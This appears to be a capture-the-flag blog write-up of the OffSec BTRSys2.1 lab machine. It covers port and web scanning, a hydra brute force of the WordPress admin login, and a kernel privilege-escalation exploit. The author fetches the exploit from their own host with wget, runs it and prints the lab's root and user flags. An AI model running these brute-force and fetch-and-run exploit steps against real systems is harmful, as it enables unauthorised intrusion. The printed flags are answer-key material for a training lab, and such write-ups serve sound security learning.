---
layout: post
title: "[Offsec] BTRSys2.1 writeup"
categories: ctf offsec oscp
---

## Introduction

The challenge is at: [Offsec Labs Play](https://portal.offsec.com/labs/play)

![offsec](/assets/images/btrisk/offsec.png)

## Scanning & Getting in

As usual, we start with an `nmap` scan.

```
> sudo nmap -v -AO -sC 192.168.194.50 -p-
[sudo] password for rzy:
Starting Nmap 7.95 ( https://nmap.org ) at 2024-06-20 18:38 CDT
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
Initiating NSE at 18:38
Completed NSE at 18:38, 0.00s elapsed
Initiating Ping Scan at 18:38
Scanning 192.168.194.50 [4 ports]
Completed Ping Scan at 18:38, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:38
Completed Parallel DNS resolution of 1 host. at 18:38, 0.00s elapsed
Initiating SYN Stealth Scan at 18:38
Scanning 192.168.194.50 [65535 ports]
Discovered open port 21/tcp on 192.168.194.50
Discovered open port 22/tcp on 192.168.194.50
Discovered open port 80/tcp on 192.168.194.50
Completed SYN Stealth Scan at 18:39, 37.43s elapsed (65535 total ports)
Initiating Service scan at 18:39
Scanning 3 services on 192.168.194.50
Completed Service scan at 18:39, 6.11s elapsed (3 services on 1 host)
Initiating OS detection (try #1) against 192.168.194.50
Retrying OS detection (try #2) against 192.168.194.50
Retrying OS detection (try #3) against 192.168.194.50
Retrying OS detection (try #4) against 192.168.194.50
Retrying OS detection (try #5) against 192.168.194.50
Initiating Traceroute at 18:39
Completed Traceroute at 18:39, 0.05s elapsed
Initiating Parallel DNS resolution of 4 hosts. at 18:39
Completed Parallel DNS resolution of 4 hosts. at 18:39, 0.00s elapsed
NSE: Script scanning 192.168.194.50.
Initiating NSE at 18:39
NSE: [ftp-bounce] PORT response: 500 Illegal PORT command.
Completed NSE at 18:39, 1.91s elapsed
Initiating NSE at 18:39
Completed NSE at 18:39, 0.36s elapsed
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Nmap scan report for 192.168.194.50
Host is up (0.044s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:192.168.45.159
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 08:ee:e3:ff:31:20:87:6c:12:e7:1c:aa:c4:e7:54:f2 (RSA)
|   256 ad:e1:1c:7d:e7:86:76:be:9a:a8:bd:b9:68:92:77:87 (ECDSA)
|_  256 0c:e1:eb:06:0c:5c:b5:cc:1b:d1:fa:56:06:22:31:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 1 disallowed entry
|_Hackers
|_http-title: Site doesn't have a title (text/html).
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.95%E=4%D=6/20%OT=21%CT=1%CU=41569%PV=Y%DS=4%DC=T%G=Y%TM=6674BDA
OS:B%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%II=I%TS=8)SEQ(SP=1
OS:04%GCD=1%ISR=10E%TI=Z%II=I%TS=8)SEQ(SP=105%GCD=1%ISR=107%TI=Z%II=I%TS=8)
OS:SEQ(SP=106%GCD=1%ISR=10B%TI=Z%II=I%TS=8)SEQ(SP=106%GCD=1%ISR=10C%TI=Z%II
OS:=I%TS=8)OPS(O1=M551ST11NW7%O2=M551ST11NW7%O3=M551NNT11NW7%O4=M551ST11NW7
OS:%O5=M551ST11NW7%O6=M551ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%
OS:W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M551NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S
OS:=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%
OS:F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G
OS:%RIPCK=G%RUCK=A641%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPC
OS:K=G%RUCK=A741%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%R
OS:UCK=A841%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=A
OS:941%RUD=G)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=AA41%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 200.444 days (since Sun Dec  3 06:59:48 2023)
Network Distance: 4 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 3389/tcp)
HOP RTT      ADDRESS
1   43.10 ms 192.168.45.1
2   41.91 ms 192.168.45.254
3   43.13 ms 192.168.251.1
4   43.16 ms 192.168.194.50

NSE: Script Post-scanning.
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Initiating NSE at 18:39
Completed NSE at 18:39, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 58.46 seconds
           Raw packets sent: 65893 (2.904MB) | Rcvd: 65677 (2.631MB)
```

Let's scan the web service for potential paths.

```
> dirbuster-ng http://192.168.194.50/                                                                                                              ~/Projects/OffSec/Labs/BTRSys2.1@homes5
{Dirbuster NG 0.1} (c)2012 WintermeW
FOUND http://192.168.194.50/// (response code 200)
FOUND http://192.168.194.50//javascript (response code 403)
FOUND http://192.168.194.50//wordpress (response code 200)
```

Seems like it's running Wordpress, let's scan it.

```
> wpscan --url http://192.168.188.50/wordpress --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.25
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://192.168.188.50/wordpress/ [192.168.188.50]
[+] Started: Fri Jun 21 18:18:20 2024

Interesting Finding(s):

[+] Headers
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://192.168.188.50/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://192.168.188.50/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://192.168.188.50/wordpress/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] WordPress version 3.9.14 identified (Insecure, released on 2016-09-07).
 | Found By: Rss Generator (Passive Detection)
 |  - http://192.168.188.50/wordpress/?feed=rss2, <generator>http://wordpress.org/?v=3.9.14</generator>
 |  - http://192.168.188.50/wordpress/?feed=comments-rss2, <generator>http://wordpress.org/?v=3.9.14</generator>

[+] WordPress theme in use: twentyfourteen
 | Location: http://192.168.188.50/wordpress/wp-content/themes/twentyfourteen/
 | Latest Version: 3.9
 | Last Updated: 2024-04-02T00:00:00.000Z
 | Style URL: http://192.168.188.50/wordpress/wp-content/themes/twentyfourteen/style.css?ver=3.9.14
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | The version could not be determined.

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:00 <=============================================================================================================> (10 / 10) 100.00% Time: 00:00:00

[i] User(s) Identified:

[+] btrisk
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jun 21 18:19:25 2024
[+] Requests Done: 59
[+] Cached Requests: 6
[+] Data Sent: 15.932 KB
[+] Data Received: 87.336 KB
[+] Memory used: 200.219 MB
[+] Elapsed time: 00:01:04
```

We got version `3.9.14`, which is fairly out-of-date. We also got 2 users: `btrisk` and `admin`.

```
> searchsploit wordpress 3.9.
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
NEX-Forms WordPress plugin < 7.9.7 - Authenticated SQLi                                                                                                  | php/webapps/51042.txt
WordPress Core < 4.0.1 - Denial of Service                                                                                                               | php/dos/35414.txt
WordPress Core < 4.7.1 - Username Enumeration                                                                                                            | php/webapps/41497.php
WordPress Core < 4.7.4 - Unauthorized Password Reset                                                                                                     | linux/webapps/41963.txt
WordPress Core < 4.9.6 - (Authenticated) Arbitrary File Deletion                                                                                         | php/webapps/44949.txt
WordPress Core < 5.2.3 - Viewing Unauthenticated/Password/Private Posts                                                                                  | multiple/webapps/47690.md
WordPress Core < 5.3.x - 'xmlrpc.php' Denial of Service                                                                                                  | php/dos/47800.py
WordPress File Upload Plugin < 4.23.3 - Stored XSS                                                                                                       | php/webapps/51899.txt
WordPress Plugin Background Takeover < 4.1.4 - Directory Traversal                                                                                       | php/webapps/44417.txt
WordPress Plugin Database Backup < 5.2 - Remote Code Execution (Metasploit)                                                                              | php/remote/47187.rb
WordPress Plugin DZS Videogallery < 8.60 - Multiple Vulnerabilities                                                                                      | php/webapps/39553.txt
WordPress Plugin EZ SQL Reports < 4.11.37 - Multiple Vulnerabilities                                                                                     | php/webapps/38176.txt
WordPress Plugin Google Map < 4.0.4 - SQL Injection                                                                                                      | php/webapps/44883.txt
WordPress Plugin iThemes Security < 7.0.3 - SQL Injection                                                                                                | php/webapps/44943.txt
WordPress Plugin Rest Google Maps < 7.11.18 - SQL Injection                                                                                              | php/webapps/48918.sh
WordPress Plugin User Role Editor < 4.25 - Privilege Escalation                                                                                          | php/webapps/44595.rb
WordPress Plugin Userpro < 4.9.17.1 - Authentication Bypass                                                                                              | php/webapps/43117.txt
WordPress Plugin UserPro < 4.9.21 - User Registration Privilege Escalation                                                                               | php/webapps/46083.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Nothing really promising here, let's try go to the login site and try to bruteforce it.

```
> hydra -t 40 -l admin -P /usr/share/wordlists/passwords/rockyou-75.txt 192.168.188.50 http-form-post '/wordpress/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwordpress%2Fwp-admin%2F&testcookie=1:incorrect'
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-06-21 20:22:05
[DATA] max 40 tasks per 1 server, overall 40 tasks, 59185 login tries (l:1/p:59185), ~1480 tries per task
[DATA] attacking http-post-form://192.168.188.50:80/wordpress/wp-login.php:log=admin&pwd=^PASS^&wp-submit=Log+In&redirect_to=%2Fwordpress%2Fwp-admin%2F&testcookie=1:incorrect
[STATUS] 4366.00 tries/min, 4366 tries in 00:01h, 54819 to do in 00:13h, 40 active
[STATUS] 4502.67 tries/min, 13508 tries in 00:03h, 45677 to do in 00:11h, 40 active
[80][http-post-form] host: 192.168.188.50   login: admin   password: admin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-06-21 20:26:53
```

Quickly enough, we got the admin credentials. After this is done, getting an unprivileged shell is easy enough.

## Privilege Escalation

```
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
$ cat /proc/version
Linux version 4.4.0-62-generic (buildd@lcy01-30) (gcc version 5.4.0 20160609 (Ubuntu 5.4.0-6ubuntu1~16.04.4) ) #83-Ubuntu SMP Wed Jan 18 14:10:15 UTC 2017
$ find /usr -type f -perm /4000
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/eject/dmcrypt-get-device
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/gpasswd
```

It's using a fairly old version of Linux, and there was no potential suid exploitations. Let's focus on the Linux kernel then.

```
> searchsploit linux 4.4 ubuntu
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel 4.10.5 / < 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                                     | linux/dos/43234.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)                                                                          | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Leak                                                                       | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privilege Escalation                                                         | linux_x86-64/local/40871.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free (PoC)                                                                                                     | linux/dos/41457.c
Linux Kernel 4.4.0 (Ubuntu) - DCCP Double-Free Privilege Escalation                                                                                      | linux/local/41458.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bounds Privilege Escalation                                                  | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Condition Privilege Escalation                                              | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalation                                                             | linux/local/39772.txt
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                                            | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                                   | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                                        | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                                    | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)                                | linux/local/47169.c
Ubuntu < 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                                   | linux/local/41760.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Let's try the `44298.c` exploitation. Since the machine doesn't have gcc installed, I will compile the code on my host and send the binary to the target.

```
# my machine
> gcc 44298.c -static
> python -m http.server 9090
Serving HTTP on 0.0.0.0 port 9090 (http://0.0.0.0:9090/) ...
```

```
$ wget http://192.168.45.159:9090/a.out
$ chmod +x a.out
$ ./a.out
a.out
task_struct = ffff880034709c00
uidptr = ffff880037d8d3c4
spawning root shell
root@ubuntu:/var/www#
root@ubuntu:/root# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@ubuntu:/root# cat proof.txt
cat proof.txt
d7bae42a9f0bd57ad7b3e5bed098129f
root@ubuntu:/root# cd /home/btrisk
cd /home/btrisk
root@ubuntu:/home/btrisk# ls
ls
local.txt
root@ubuntu:/home/btrisk# cat local.txt 
cat local.txt
6fc8d6de5815eb5128de12f313f6a1ad
```
